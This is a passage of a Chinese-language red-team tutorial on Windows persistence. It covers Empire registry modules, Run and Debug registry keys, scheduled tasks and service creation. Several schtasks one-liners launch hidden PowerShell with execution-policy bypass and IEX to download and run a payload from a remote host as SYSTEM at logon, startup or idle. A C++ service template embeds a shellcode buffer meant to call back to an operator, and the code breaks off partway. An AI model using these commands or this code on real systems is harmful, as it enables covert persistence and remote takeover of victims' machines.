<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Debug</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt=" Empire – Debug 注册表项payload" src="/assets/images/894761-20191105134757216-192137544-e9558727d0addb553f1e606e4e49d581.png" width="1024" height="339" class="img_ev3q"></p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">usemodule persistence/userland/registry</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">usemodule persistence/elevated/registry*</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt=" Empire –Persistence Registry Module" src="/assets/images/894761-20191105134849170-772894554-6b9d55d6969a1f22a367c423340c925c.png" width="1024" height="182" class="img_ev3q"></p>
<p>将在名称<strong>Updater</strong>下创建另一个注册表项，该注册表项将包含要执行的命令。PowerShell将尝试在下次登录时运行<strong>Debug</strong>密钥中存储的payload，以实现持久性。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt=" Empire – Registry Run Key" src="/assets/images/894761-20191105134938861-1302950283-b9a76aeafe9e3ab9dcf29105c4899840.png" width="1024" height="473" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="计划任务">计划任务<a href="#计划任务" class="hash-link" aria-label="计划任务的直接链接" title="计划任务的直接链接">​</a></h2>
<p>Windows操作系统提供了一个实用程序（schtasks.exe），使系统管理员能够在特定的日期和时间执行程序或脚本。这种行为可作为一种持久性机制被red team利用。通过计划任务执行持久性不需要管理员权限，但如果已获得提升的权限，则允许进一步操作，例如在用户登录期间或在空闲状态期间执行任务。
计划任务的持久化技术可以手动实现，也可以自动实现。payload可以从磁盘或远程位置执行，它们可以是可执行文件、powershell脚本或scriptlet的形式。<strong>这被认为是一种旧的持久性技术，但是它仍然可以在red team场景中使用，并且由各种开源工具支持</strong>。</p>
<blockquote>
<p>图形化位置：开始--所有程序--附件--系统工具--任务计划程序</p>
</blockquote>
<p>Windows命令行实现定时任务主要有schtasks与at二种方式:</p>
<p>at 适用于windows xp/2003，schtasks适用于win7/2008或者以后</p>
<p>每五分钟执行一次</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">schtasks </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">create </span><span class="token operator" style="color:#393A34">/</span><span class="token function" style="color:#d73a49">sc</span><span class="token plain"> minute </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">mo 5 </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">tn </span><span class="token string" style="color:#e3116c">&quot;sd&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">tr C:\Windows\System32\cmd</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe</span><br></span></code></pre></div></div>
<p>该任务将在每个Windows登录中以SYSTEM的形式下载并执行基于PowerShell的payload。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">schtasks </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">create </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">tn PentestLab </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">tr </span><span class="token string" style="color:#e3116c">&quot;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#x27;IEX ((new-object net.webclient).downloadstring(&#x27;&#x27;http://10.0.2.21:8080/ZPWLywg&#x27;&#x27;&#x27;))&#x27;&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token function" style="color:#d73a49">sc</span><span class="token plain"> onlogon </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">ru System</span><br></span></code></pre></div></div>
<p>一些举例</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#(X64) - On System Start</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">schtasks /create /tn PentestLab /tr </span><span class="token string" style="color:#e3116c">&quot;c:\windows\syswow64\WindowsPowerShell</span><span class="token string entity" style="color:#36acaa">\v</span><span class="token string" style="color:#e3116c">1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#x27;IEX </span><span class="token string variable punctuation" style="color:#393A34">((</span><span class="token string variable" style="color:#36acaa">new</span><span class="token string variable operator" style="color:#393A34">-</span><span class="token string variable" style="color:#36acaa">object net.webclient</span><span class="token string variable punctuation" style="color:#393A34">)</span><span class="token string variable" style="color:#36acaa">.downloadstring</span><span class="token string variable punctuation" style="color:#393A34">(</span><span class="token string variable" style="color:#36acaa">&#x27;&#x27;http</span><span class="token string variable operator" style="color:#393A34">:</span><span class="token string variable operator" style="color:#393A34">/</span><span class="token string variable operator" style="color:#393A34">/</span><span class="token string variable number" style="color:#36acaa">10.0</span><span class="token string variable number" style="color:#36acaa">.2</span><span class="token string variable number" style="color:#36acaa">.21</span><span class="token string variable operator" style="color:#393A34">:</span><span class="token string variable number" style="color:#36acaa">8080</span><span class="token string variable operator" style="color:#393A34">/</span><span class="token string variable" style="color:#36acaa">ZPWLywg&#x27;&#x27;&#x27;</span><span class="token string variable punctuation" style="color:#393A34">))</span><span class="token string" style="color:#e3116c">&#x27;&quot;</span><span class="token plain"> /sc onstart /ru System</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#(X64) - On User Idle (30mins)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">schtasks /create /tn PentestLab /tr </span><span class="token string" style="color:#e3116c">&quot;c:\windows\syswow64\WindowsPowerShell</span><span class="token string entity" style="color:#36acaa">\v</span><span class="token string" style="color:#e3116c">1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#x27;IEX </span><span class="token string variable punctuation" style="color:#393A34">((</span><span class="token string variable" style="color:#36acaa">new</span><span class="token string variable operator" style="color:#393A34">-</span><span class="token string variable" style="color:#36acaa">object net.webclient</span><span class="token string variable punctuation" style="color:#393A34">)</span><span class="token string variable" style="color:#36acaa">.downloadstring</span><span class="token string variable punctuation" style="color:#393A34">(</span><span class="token string variable" style="color:#36acaa">&#x27;&#x27;http</span><span class="token string variable operator" style="color:#393A34">:</span><span class="token string variable operator" style="color:#393A34">/</span><span class="token string variable operator" style="color:#393A34">/</span><span class="token string variable number" style="color:#36acaa">10.0</span><span class="token string variable number" style="color:#36acaa">.2</span><span class="token string variable number" style="color:#36acaa">.21</span><span class="token string variable operator" style="color:#393A34">:</span><span class="token string variable number" style="color:#36acaa">8080</span><span class="token string variable operator" style="color:#393A34">/</span><span class="token string variable" style="color:#36acaa">ZPWLywg&#x27;&#x27;&#x27;</span><span class="token string variable punctuation" style="color:#393A34">))</span><span class="token string" style="color:#e3116c">&#x27;&quot;</span><span class="token plain"> /sc onidle /i </span><span class="token number" style="color:#36acaa">30</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#(X86) - On User Login</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">schtasks /create /tn PentestLab /tr </span><span class="token string" style="color:#e3116c">&quot;c:\windows\system32\WindowsPowerShell</span><span class="token string entity" style="color:#36acaa">\v</span><span class="token string" style="color:#e3116c">1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#x27;IEX </span><span class="token string variable punctuation" style="color:#393A34">((</span><span class="token string variable" style="color:#36acaa">new</span><span class="token string variable operator" style="color:#393A34">-</span><span class="token string variable" style="color:#36acaa">object net.webclient</span><span class="token string variable punctuation" style="color:#393A34">)</span><span class="token string variable" style="color:#36acaa">.downloadstring</span><span class="token string variable punctuation" style="color:#393A34">(</span><span class="token string variable" style="color:#36acaa">&#x27;&#x27;http</span><span class="token string variable operator" style="color:#393A34">:</span><span class="token string variable operator" style="color:#393A34">/</span><span class="token string variable operator" style="color:#393A34">/</span><span class="token string variable number" style="color:#36acaa">10.0</span><span class="token string variable number" style="color:#36acaa">.2</span><span class="token string variable number" style="color:#36acaa">.21</span><span class="token string variable operator" style="color:#393A34">:</span><span class="token string variable number" style="color:#36acaa">8080</span><span class="token string variable operator" style="color:#393A34">/</span><span class="token string variable" style="color:#36acaa">ZPWLywg&#x27;&#x27;&#x27;</span><span class="token string variable punctuation" style="color:#393A34">))</span><span class="token string" style="color:#e3116c">&#x27;&quot;</span><span class="token plain"> /sc onlogon /ru System</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#(X86) - On System Start</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">schtasks /create /tn PentestLab /tr </span><span class="token string" style="color:#e3116c">&quot;c:\windows\system32\WindowsPowerShell</span><span class="token string entity" style="color:#36acaa">\v</span><span class="token string" style="color:#e3116c">1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#x27;IEX </span><span class="token string variable punctuation" style="color:#393A34">((</span><span class="token string variable" style="color:#36acaa">new</span><span class="token string variable operator" style="color:#393A34">-</span><span class="token string variable" style="color:#36acaa">object net.webclient</span><span class="token string variable punctuation" style="color:#393A34">)</span><span class="token string variable" style="color:#36acaa">.downloadstring</span><span class="token string variable punctuation" style="color:#393A34">(</span><span class="token string variable" style="color:#36acaa">&#x27;&#x27;http</span><span class="token string variable operator" style="color:#393A34">:</span><span class="token string variable operator" style="color:#393A34">/</span><span class="token string variable operator" style="color:#393A34">/</span><span class="token string variable number" style="color:#36acaa">10.0</span><span class="token string variable number" style="color:#36acaa">.2</span><span class="token string variable number" style="color:#36acaa">.21</span><span class="token string variable operator" style="color:#393A34">:</span><span class="token string variable number" style="color:#36acaa">8080</span><span class="token string variable operator" style="color:#393A34">/</span><span class="token string variable" style="color:#36acaa">ZPWLywg&#x27;&#x27;&#x27;</span><span class="token string variable punctuation" style="color:#393A34">))</span><span class="token string" style="color:#e3116c">&#x27;&quot;</span><span class="token plain"> /sc onstart /ru System</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#(X86) - On User Idle (30mins)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">schtasks /create /tn PentestLab /tr </span><span class="token string" style="color:#e3116c">&quot;c:\windows\system32\WindowsPowerShell</span><span class="token string entity" style="color:#36acaa">\v</span><span class="token string" style="color:#e3116c">1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#x27;IEX </span><span class="token string variable punctuation" style="color:#393A34">((</span><span class="token string variable" style="color:#36acaa">new</span><span class="token string variable operator" style="color:#393A34">-</span><span class="token string variable" style="color:#36acaa">object net.webclient</span><span class="token string variable punctuation" style="color:#393A34">)</span><span class="token string variable" style="color:#36acaa">.downloadstring</span><span class="token string variable punctuation" style="color:#393A34">(</span><span class="token string variable" style="color:#36acaa">&#x27;&#x27;http</span><span class="token string variable operator" style="color:#393A34">:</span><span class="token string variable operator" style="color:#393A34">/</span><span class="token string variable operator" style="color:#393A34">/</span><span class="token string variable number" style="color:#36acaa">10.0</span><span class="token string variable number" style="color:#36acaa">.2</span><span class="token string variable number" style="color:#36acaa">.21</span><span class="token string variable operator" style="color:#393A34">:</span><span class="token string variable number" style="color:#36acaa">8080</span><span class="token string variable operator" style="color:#393A34">/</span><span class="token string variable" style="color:#36acaa">ZPWLywg&#x27;&#x27;&#x27;</span><span class="token string variable punctuation" style="color:#393A34">))</span><span class="token string" style="color:#e3116c">&#x27;&quot;</span><span class="token plain"> /sc onidle /i </span><span class="token number" style="color:#36acaa">30</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="服务">服务<a href="#服务" class="hash-link" aria-label="服务的直接链接" title="服务的直接链接">​</a></h2>
<p>在 Windows上还有一个重要的机制，也就是服务。服务程序通常默默的运行在后台，且拥有 SYSTEM 权限，非常适合用于后门持久化。我们可以将 EXE /DLL等可执行文件注册为服务实现后门持久化。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="创建服务">创建服务<a href="#创建服务" class="hash-link" aria-label="创建服务的直接链接" title="创建服务的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="cmd直接创建服务">CMD直接创建服务<a href="#cmd直接创建服务" class="hash-link" aria-label="CMD直接创建服务的直接链接" title="CMD直接创建服务的直接链接">​</a></h4>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sc</span><span class="token plain"> create </span><span class="token string" style="color:#e3116c">&quot;SD&quot;</span><span class="token plain"> binpath= </span><span class="token string" style="color:#e3116c">&quot;C:\Users\SD\Desktop\test.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sc</span><span class="token plain"> description </span><span class="token string" style="color:#e3116c">&quot;SD&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;description&quot;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># 设置服务的描述字符串</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sc</span><span class="token plain"> config </span><span class="token string" style="color:#e3116c">&quot;SD&quot;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">start</span><span class="token plain">= auto  </span><span class="token comment" style="color:#999988;font-style:italic"># 设置这个服务为自动启动</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net </span><span class="token function" style="color:#d73a49">start</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;SD&quot;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># 启动服务</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sc</span><span class="token plain"> create pentestlab binpath= </span><span class="token string" style="color:#e3116c">&quot;cmd.exe /k C:\temp\pentestlab.exe&quot;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">start</span><span class="token plain">=</span><span class="token string" style="color:#e3116c">&quot;auto&quot;</span><span class="token plain"> obj=</span><span class="token string" style="color:#e3116c">&quot;LocalSystem&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sc</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">start</span><span class="token plain"> pentestlab</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191107214314870-908960496-d20ff84fc7994bbca09da0d392d6a7cd.png" width="1024" height="239" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="powershell创建服务">Powershell创建服务<a href="#powershell创建服务" class="hash-link" aria-label="Powershell创建服务的直接链接" title="Powershell创建服务的直接链接">​</a></h4>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">New-Service</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Name </span><span class="token string" style="color:#e3116c">&quot;pentestlab&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">BinaryPathName </span><span class="token string" style="color:#e3116c">&quot;C:\temp\pentestlab.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Description </span><span class="token string" style="color:#e3116c">&quot;PentestLaboratories&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">StartupType Automatic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sc</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">start</span><span class="token plain"> pentestlab</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191107214402611-556595327-2b0bc9ddef97ab80887ebfa3f15a47be.png" width="1024" height="180" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="其他">其他<a href="#其他" class="hash-link" aria-label="其他的直接链接" title="其他的直接链接">​</a></h4>
<p>也可以直接编写一个服务,穿插着shellcode上线</p>
<div class="language-C++ language-c++ codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c++ codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#include &lt;windows.h&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#include &lt;iostream&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned char buf[] =&quot;\xfc\xe8\x89\x00\x00...............................................\x36\x38\x2e\x31\x2e\x31\x30\x36\x00\x12\x34\x56\x78&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#define SLEEP_TIME 5000                          /*间隔时间*/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#define LOGFILE &quot;C:\\Windows\\log1.txt&quot;              /*信息输出文件*/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SERVICE_STATUS ServiceStatus;  /*服务状态*/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SERVICE_STATUS_HANDLE hStatus; /*服务状态句柄*/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">void  ServiceMain(int argc, char** argv);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">void  CtrlHandler(DWORD request);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">int   InitService();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">int main(int argc, CHAR* argv[])</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WCHAR WserviceName[] = TEXT(&quot;sddd&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SERVICE_TABLE_ENTRY ServiceTable[2];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceTable[0].lpServiceName = WserviceName;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceTable[1].lpServiceName = NULL;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceTable[1].lpServiceProc = NULL;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">StartServiceCtrlDispatcher(ServiceTable);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">int WriteToLog(const char* str)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FILE* pfile;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fopen_s(&amp;pfile, LOGFILE, &quot;a+&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if (pfile == NULL)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return -1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fprintf_s(pfile, &quot;%s\n&quot;, str);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fclose(pfile);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/*Service initialization*/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">int InitService()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CHAR Message[] = &quot;Monitoring started.&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OutputDebugString(TEXT(&quot;Monitoring started.&quot;));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">int result;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">result = WriteToLog(Message);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return(result);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/*Control Handler*/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">void CtrlHandler(DWORD request)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">switch (request)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">case SERVICE_CONTROL_STOP:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WriteToLog(&quot;Monitoring stopped.&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceStatus.dwWin32ExitCode = 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceStatus.dwCurrentState = SERVICE_STOPPED;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SetServiceStatus(hStatus, &amp;ServiceStatus);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">case SERVICE_CONTROL_SHUTDOWN:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WriteToLog(&quot;Monitoring stopped.&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceStatus.dwWin32ExitCode = 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceStatus.dwCurrentState = SERVICE_STOPPED;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SetServiceStatus(hStatus, &amp;ServiceStatus);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">default:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">break;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/* Report current status  */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SetServiceStatus(hStatus, &amp;ServiceStatus);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">void ServiceMain(int argc, char** argv)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WCHAR WserviceName[] = TEXT(&quot;sddd&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">int error;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceStatus.dwServiceType =</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SERVICE_WIN32;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceStatus.dwCurrentState =</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SERVICE_START_PENDING;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/*在本例中只接受系统关机和停止服务两种控制命令*/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceStatus.dwControlsAccepted =</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SERVICE_ACCEPT_SHUTDOWN |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SERVICE_ACCEPT_STOP;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceStatus.dwWin32ExitCode = 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceStatus.dwServiceSpecificExitCode = 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceStatus.dwCheckPoint = 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceStatus.dwWaitHint = 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hStatus = ::RegisterServiceCtrlHandler(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WserviceName,</span><br></span><span 